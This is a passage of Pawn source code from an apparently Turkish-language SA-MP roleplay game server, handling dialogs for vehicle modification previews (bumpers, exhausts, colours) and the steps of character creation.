		  		        ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
		  		        Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
		  		        return 1;
					}

		        }// case 2,3ü kapatýr
		    }//responseden sonraki switch listitemi kapatýr
		}//responseyi kapatýr
	    else //if response elsesi
	    {
			if(GetPlayerVehicleModel(playerid) == 525) ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk","Seç","Çýkýþ");
			else ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
	    }
	    return 1;
	}//dialogu kapatýr
	if(dialogid == DIALOG_ONTAMPON){
	    if(response){
	        Modifiyede[playerid] = GetPlayerVehicleID(playerid);
	        new modelid = GetVehicleModel(Modifiyede[playerid]);
	        SetPVarInt(playerid, "ModifiyeNe", 3);
	        switch(listitem){
	            case 0,1:{
	                if(modelid == 562 || modelid == 565 || modelid == 559 || modelid == 561 || modelid == 560 || modelid == 558){
	                    if(listitem == 0){
	                        switch(modelid){
	                            case 562:{
	                                AddVehicleComponent(GetPlayerVehicleID(playerid), 1171);
	                                Onizlemede[playerid] = 1171;
	                            }
	                            case 565:
	                            {
	                                AddVehicleComponent(GetPlayerVehicleID(playerid), 1153);
	                                Onizlemede[playerid] = 1153;
	                            }
	                            case 559:
	                            {
	                                AddVehicleComponent(GetPlayerVehicleID(playerid),1160);
	                                Onizlemede[playerid] = 1160;
	                            }
	                            case 561:
	                            {
	                                AddVehicleComponent(GetPlayerVehicleID(playerid),1155);
	                                Onizlemede[playerid] = 1155;
	                            }
	                            case 560:
	                            {
	                                AddVehicleComponent(GetPlayerVehicleID(playerid),1169);
	                                Onizlemede[playerid] = 1169;
	                            }
	                            case 558:
	                            {
	                                AddVehicleComponent(GetPlayerVehicleID(playerid),1166);
	                                Onizlemede[playerid] = 1166;
	                            }
	                        }//switch modelidyi kapatýr
	                    }//listitem 0ý kapatýr
	                    else if(listitem == 1){
	                        switch(modelid){
	                            case 562:{
	                                AddVehicleComponent(GetPlayerVehicleID(playerid),1172);
	                                Onizlemede[playerid] = 1172;
								}
								case 565:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1152);
								    Onizlemede[playerid] = 1152;
								}
								case 559:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1173);
								    Onizlemede[playerid] = 1173;
								}
								case 561:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1157);
								    Onizlemede[playerid] = 1157;
								}
								case 560:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1170);
								    Onizlemede[playerid] = 1170;
								}
								case 558:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1165);
								    Onizlemede[playerid] = 1165;
								}
	                        }//listitem1den sonraki switch modelidyi kapatýr
	                    }//listitem 1i kapatýr else if olaný
						Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
	                }//modelid 562,565,559 ile baþlayan ve devam edeni kapatýr
		  		    else{
		  		        ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
		  		        Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
		  		        return 1;
					}
				 }//case 0,1i kapatýr
				 case 2,3:{
				    if(modelid == 575 || modelid == 534 || modelid == 567 || modelid == 536 || modelid == 576 || modelid == 535){
				        if(listitem == 2){
				            switch(modelid){
				                case 575:{
				                    AddVehicleComponent(GetPlayerVehicleID(playerid),1174);
				                    Onizlemede[playerid] = 1174;
				                }
				                case 534:{
				                    AddVehicleComponent(GetPlayerVehicleID(playerid),1179);
				                    Onizlemede[playerid] = 1179;
								}
				                case 567:{
				                    AddVehicleComponent(GetPlayerVehicleID(playerid),1189);
				                    Onizlemede[playerid] = 1189;
				                }
				                case 536:{
				                    AddVehicleComponent(GetPlayerVehicleID(playerid),1182);
				                    Onizlemede[playerid] = 1182;
				                }
				                case 576:{
				                    AddVehicleComponent(GetPlayerVehicleID(playerid),1191);
				                    Onizlemede[playerid] = 1191;
				                }
				                case 535:{
				                    AddVehicleComponent(GetPlayerVehicleID(playerid),1115);
				                    Onizlemede[playerid] = 1115;
				                }
				            }//listitem2den sonraki switch modelidyi kapatýr
				        }//listitem 2yi kapatýr
				        else if(listitem == 3){
				            switch(modelid){
				                case 575:{
				                    AddVehicleComponent(GetPlayerVehicleID(playerid),1175);
				                    Onizlemede[playerid] = 1175;
				                }
				                case 534:{
				                    AddVehicleComponent(GetPlayerVehicleID(playerid),1185);
				                    Onizlemede[playerid] = 1185;
				                }
				                case 567:{
				                    AddVehicleComponent(GetPlayerVehicleID(playerid),1188);
				                    Onizlemede[playerid] = 1188;
				                }
				                case 536:{
				                    AddVehicleComponent(GetPlayerVehicleID(playerid),1181);
				                    Onizlemede[playerid] = 1181;
								}
								case 576:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1190);
								    Onizlemede[playerid] = 1190;
								}
								case 535:{
                                    AddVehicleComponent(GetPlayerVehicleID(playerid),1116);
                                    Onizlemede[playerid] = 1116;
								}
				            }//listitem3den sonraki switch modelidyi kapatýr
				        }//listitem 3ü kapatýr
						Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
					}//modelid 575,534,567yi kapatýr
		  		    else{
		  		        ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
		  		        Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
		  		        return 1;
					}
				 }//case 2,3ü kapatýr
	        }//switch listitemi kapatýr
		}//responseyi kapatýr
	    else //if response elsesi
	    {
			if(GetPlayerVehicleModel(playerid) == 525) ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk","Seç","Çýkýþ");
			else ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
	    }
		return 1;
	}//dialogu kapatýr
	if(dialogid == DIALOG_EGZOZ)
	{
	    if(response)
	    {
	        Modifiyede[playerid] = GetPlayerVehicleID(playerid);
	    	new modelid = GetVehicleModel(Modifiyede[playerid]);
	    	SetPVarInt(playerid, "ModifiyeNe", 2);
			switch(listitem)
			{
				case 0,1:
				{
				  	if(modelid == 562 || modelid == 565 || modelid == 559 || modelid == 561 || modelid == 560 || modelid == 558)
				  	{
				  	    if(listitem == 0)
				  	    {
							switch(modelid)
							{
							    case 562:
								{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1034);
									Onizlemede[playerid] = 1034;
								}
							    case 565:
								{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1046);
									Onizlemede[playerid] = 1046;
								}
							    case 559:
								{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1065);
									Onizlemede[playerid] = 1065;
							    }
							    case 561:
								{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1064);
									Onizlemede[playerid] = 1064;
							    }
							    case 560:
								{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1028);
									Onizlemede[playerid] = 1028;
							    }
							    case 558:
								{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1089);
									Onizlemede[playerid] = 1089;
							    }
							}
						}
						else if(listitem == 1)
						{
						    switch(modelid)
						    {
						        case 562:
								{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1037);
									Onizlemede[playerid] = 1037;
								}
						        case 565:
								{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1045);
									Onizlemede[playerid] = 1045;
						        }
						        case 559:
								{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1066);
									Onizlemede[playerid] = 1066;
								}
						        case 561:
								{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1059);
									Onizlemede[playerid] = 1059;
						        }
						        case 560:
								{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1029);
									Onizlemede[playerid] = 1029;
						        }
						        case 558:
								{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1092);
									Onizlemede[playerid] = 1092;
						        }
						    }//switch modelid 2.yi kapatýr
						} //listitem == 1 else ifi kapatýr
						Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
				  	} // if modelid 562, 565, 559 ile devam edeni kapatýr
		  		    else
		  		    {
		  		        ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
		  		        Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
		  		        return 1;
					}
		  		} //case 0,1i kapatýr
		  		case 2,3:
		  		{
		  		    if(modelid == 575 || modelid == 534 || modelid == 567 || modelid == 536 || modelid == 576 || modelid == 496 || modelid == 535)
		  		    {
		  		        if(listitem == 2)
		  		        {
		  		            switch(modelid)
		  		            {
		  		                case 575:
		  		                {
		  		                    AddVehicleComponent(GetPlayerVehicleID(playerid),1044);
		  		                    Onizlemede[playerid] = 1044;
		  		                }
		  		                case 534:
		  		                {
                                	AddVehicleComponent(GetPlayerVehicleID(playerid),1126);
                                	Onizlemede[playerid]= 1126;
		  		                }
		  		                case 567:
		  		                {
		  		                    AddVehicleComponent(GetPlayerVehicleID(playerid),1129);
		  		                    Onizlemede[playerid] = 1129;
								}
								case 536:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1104);
								    Onizlemede[playerid] = 1104;
								}
								case 576:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1136);
								    Onizlemede[playerid] = 1136;
								}
								case 496:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 535:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1113);
								    Onizlemede[playerid] = 1113;
								}
							}// listitem2den önceki switch modelidyi kapatýr
		  		        }//listitem == 2yi kapatýr
		  		        else if(listitem == 3)
		  		        {
		  		            switch(modelid)
							{
		  		                case 575:
		  		                {
		  		                    AddVehicleComponent(GetPlayerVehicleID(playerid),1043);
		  		                    Onizlemede[playerid] = 1043;
		  		                }
		  		                case 534:
		  		                {
		  		                    AddVehicleComponent(GetPlayerVehicleID(playerid),1127);
		  		                    Onizlemede[playerid] = 1127;
		  		                }
		  		                case 567:
		  		                {
		  		                    AddVehicleComponent(GetPlayerVehicleID(playerid),1132);
		  		                    Onizlemede[playerid] = 1132;
		  		                }
		  		                case 536:
		  		                {
		  		                    AddVehicleComponent(GetPlayerVehicleID(playerid),1105);
		  		                    Onizlemede[playerid] = 1105;
		  		                }
		  		                case 576:
		  		                {
		  		                    AddVehicleComponent(GetPlayerVehicleID(playerid),1135);
		  		                    Onizlemede[playerid] = 1135;
		  		                }
		  		                case 535:
		  		                {
		  		                    AddVehicleComponent(GetPlayerVehicleID(playerid),1114);
		  		                    Onizlemede[playerid] = 1114;
								}
		  		            }//listitem3den önceki modelidyi kapatýr
						}//listitem 3ü kapatýr
		  		    }//modelid 575,534,567,536 ile devam edeni kapatýr
		  		    else
		  		    {
		  		        ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
		  		        Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
		  		        return 1;
					}
		  		} // case 2,3ü kapatýr
		  		case 4,5:
		  		{
		  		    if(modelid == 496 ||modelid == 534 || modelid == 567 || modelid == 536 || modelid == 576 || modelid == 496 || modelid == 518 || modelid == 527 ||
  					modelid == 542 || modelid == 589 || modelid == 585 || modelid == 400 || modelid == 517 || modelid == 410 || modelid == 551 || modelid == 500 ||
					modelid == 516 || modelid == 404 || modelid == 603 || modelid == 426 || modelid == 436 || modelid == 547 || modelid == 489 || modelid == 405 ||
			  		modelid == 550 || modelid == 540 || modelid == 491 || modelid == 421 || modelid == 529 || modelid == 477 || modelid == 415 || modelid == 535)
		  		    {
		  		        if(listitem == 4)
		  		        {
		  		            switch(modelid)
		  		            {
		  		                case 496:
		  		                {
		  		                    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
		  		                    Onizlemede[playerid] = 1020;
		  		                }
		  		                case 518:
		  		                {
		  		                    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
		  		                    Onizlemede[playerid] = 1020;
								}
								case 527:
								{
                                    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
                                    Onizlemede[playerid] = 1020;
								}
								case 542:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 589:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 585:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 400:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 517:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 410:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 551:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 500:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 516:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 404:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 603:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 426:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 436:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 547:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 489:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 405:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 550:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 549:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 540:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
									Onizlemede[playerid] = 1020;
								}
								case 491:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 421:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 529:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
								case 477:
								{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1020);
								    Onizlemede[playerid] = 1020;
								}
							}//listitem 4'den sonrakini kapatýr
						}//listitem 4ü kapatýr
						else if(listitem == 5)
						{
						    switch(modelid)
						    {
						        case 496:
						        {
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
						        }
						        case 415:
						        {
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
						        }
						        case 542:
						        {
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
						        }
						        case 585:
						        {
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
						        }
						        case 546:
						        {
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
						        }
						        case 400:
						        {
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 517:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 410:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 551:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 500:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 516:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 404:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 603:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 436:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 547:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 489:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 405:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 550:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 549:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 540:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 491:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 421:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 529:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
								case 477:
								{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1019);
						            Onizlemede[playerid] = 1019;
								}
							}//listitem5den sonraki switch modelidyi kapatýr
						}//listitem 5i kapatýr
						Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
		  		    } //if modelid 496,534,567,536 ile baþlayaný kapatýr
		  		    else
		  		    {
		  		        ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
		  		        Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
		  		        return 1;
					}
		  		}//case 4,5i kapatýr
		  	}//switch listitemi kapatýr
	    }// if responseyi kapatýr
	    else //if response elsesi
	    {
			if(GetPlayerVehicleModel(playerid) == 525) ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk","Seç","Çýkýþ");
			else ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
	    }//if response elsesini kapatýr
	    return 1;
	}//dialogu kapatýr
	if(dialogid == DIALOG_PAINTJOB)
	{
	    if(response)
	    {
	        Hata(playerid, "Paintjob seçeneði bir süreliðine pasif duruMDAdýr.");
			if(GetPlayerVehicleModel(playerid) == 525) ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk","Seç","Çýkýþ");
			else ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
	    }//if responseyi kapatýyor
	    else //if response elsesi
	    {
			if(GetPlayerVehicleModel(playerid) == 525) ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk","Seç","Çýkýþ");
			else ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
	    }
	}//dialogu kapatýyor bu da
	if(dialogid == DIALOG_RENK1)
	{
		if(response)
		{
	        if(!strlen(inputtext) || strlen(inputtext) > 7) return ShowPlayerDialog(playerid,DIALOG_RENK1,DIALOG_STYLE_INPUT,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Hatalý giriþ yaptýnýz.\nAracýn renklerini arada virgül olacak þekilde giriniz. \nAraç renk kodlarýna web sitesinden ulaþabilirsiniz.\n{AA3333}ÖRNEK: {6F6F6F}0,0 {FFFFFF}(siyah)","Tamam","");
		 	if(strfind(inputtext, ",", true) == -1) return ShowPlayerDialog(playerid,DIALOG_RENK1,DIALOG_STYLE_INPUT,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Hatalý giriþ yaptýnýz.\nAracýn renklerini arada virgül olacak þekilde giriniz. \nAraç renk kodlarýna web sitesinden ulaþabilirsiniz.\n{AA3333}ÖRNEK: {6F6F6F}0,0 {FFFFFF}(siyah)","Tamam","");
	        new raxe[2][5];
	        split(inputtext, raxe, ',',5);
			new runk1 = strval(raxe[0]);
			new runk2 = strval(raxe[1]);
			if(runk1 > 252 || runk2 > 252 || runk1 < 0 || runk2 < 0) return ShowPlayerDialog(playerid,DIALOG_RENK1,DIALOG_STYLE_INPUT,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk kodlarý 0 ile 252 arasýnda olmalýdýr.\nAracýn renklerini arada virgül olacak þekilde giriniz. \nAraç renk kodlarýna web sitesinden ulaþabilirsiniz.\n{AA3333}ÖRNEK: {6F6F6F}0,0 {FFFFFF}(siyah)","Tamam","");
			Modifiyede[playerid] = GetPlayerVehicleID(playerid);
			Onizlemede[playerid] = runk1;
			SetPVarInt(playerid, "ModifiyeRenk2", runk2);
			SetPVarInt(playerid, "ModifiyeNe", 1);
			ChangeVehicleColor(GetPlayerVehicleID(playerid), runk1, runk2);
			Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
		}
		else
		{
			if(GetPlayerVehicleModel(playerid) == 525) ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk","Seç","Çýkýþ");
			else ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
		}
		return 1;
	}

	if(dialogid == 160)
	{
	    if(response)
	    {
	        Karakter[playerid][cinsiyet] = 1;
	        Bilgi(playerid, "Karakterinizin cinsiyeti erkek olarak belirlendi.");
	    }
	    else
	    {
	        Karakter[playerid][cinsiyet] = 2;
			Bilgi(playerid, "Karakterinizin cinsiyeti kadýn olarak belirlendi.");
	    }
  		if(!Karakter[playerid][uyruk])
		{
		    ShowPlayerDialog(playerid, 163, DIALOG_STYLE_MSGBOX, "Ten Rengi Seçimi", "[!]DÝKKAT Yaptýðýnýz seçimin geri dönüþü olmayacaktýr.\n\n[!]DÝKKAT ESC tuþuna basmanýz halinde ten renginiz beyaz olarak belirlenir.\n\nLütfen seçiminizi yapýnýz.", "Siyahi", "Beyaz");
		}
		else if(Karakter[playerid][skin] <= 0) {
			Karakter[playerid][posx] = 182.6387,Karakter[playerid][posy] = -88.6457,Karakter[playerid][posz] = 1002.0234;
			SetPlayerPos(playerid, Karakter[playerid][posx], Karakter[playerid][posy], Karakter[playerid][posz]);
			SetPlayerFacingAngle(playerid, 91.8941);
   			SetPlayerInterior(playerid, 18);
   			SetPlayerVirtualWorld(playerid, playerid+1);
   			SetPlayerCameraPos(playerid,179.4780,-88.2440,1002.0234);
			SetPlayerCameraLookAt(playerid,182.4245,-88.1048,1002.0234);
			TogglePlayerControllable(playerid, 0);
   			if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, egirisbeyaz, "Kiyafet Secimi");
			if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, egirissiyah, "Kiyafet Secimi");
			if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, kgirisbeyaz, "Kiyafet Secimi");
			if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, kgirissiyah, "Kiyafet Secimi");
		}
		else if(!Karakter[playerid][yas])
		{
		    ShowPlayerDialog(playerid, 164, DIALOG_STYLE_INPUT, "Yaþ Seçimi", "[!]DÝKKAT Yaptýðýnýz seçimin geri dönüþü olmayacaktýr.\n\nLütfen yaþýnýzý girin. ", "Seçim", "");
		}
		else if(!DilKontrolEx(playerid))
		{
		    ShowPlayerDialog(playerid, 299, DIALOG_STYLE_LIST, "Ana Dil Seçimi(Tekrar Seçemezsiniz.)", "Almanca\nArapça\nÇince\nFransýzca\nÝspanyolca\nÝtalyanca\nJaponca\nRusça\nÝbranice\nYunanca\nErmenice\nSlovakça\nÝrlandaca\nPortekizce\nSýrpça\nArnavutça\nÝngilizce", "Seçim", "");
		}
		else if(!Karakter[playerid][boy])
		{
		    ShowPlayerDialog(playerid, 445, DIALOG_STYLE_LIST, "Boy Seçimi", "1.50-1.60m\n1.61-1.70m\n1.71-1.76m\n1.77-1.85m\n+1.85m", "Seçim", "");
		}
		else if(!Karakter[playerid][kilo])
		{
		    ShowPlayerDialog(playerid, 446, DIALOG_STYLE_LIST, "Kilo Seçimi", "40-50kg\n51-60kg\n61-65kg\n66-75kg\n76-85kg\n86-90kg\n91-100kg\n101-120kg\n+120kg", "Seçim", "");
		}
		else if(!Karakter[playerid][gozrenk])
		{
		    ShowPlayerDialog(playerid, 447, DIALOG_STYLE_LIST, "Göz Rengi Seçimi", "Siyah\nKahverengi\nMavi\nYeþil\nDiðer", "Seçim", "");
		}
		else if(!Karakter[playerid][sacrenk])
		{
		    ShowPlayerDialog(playerid, 448, DIALOG_STYLE_LIST, "Saç Rengi Seçimi", "Kel\nSiyah\nKahverengi\nKumral\nSarý\nKýzýl\nDiðer", "Seçim", "");
		}
	    return 1;
	}
	if(dialogid == 161)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new sahip = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
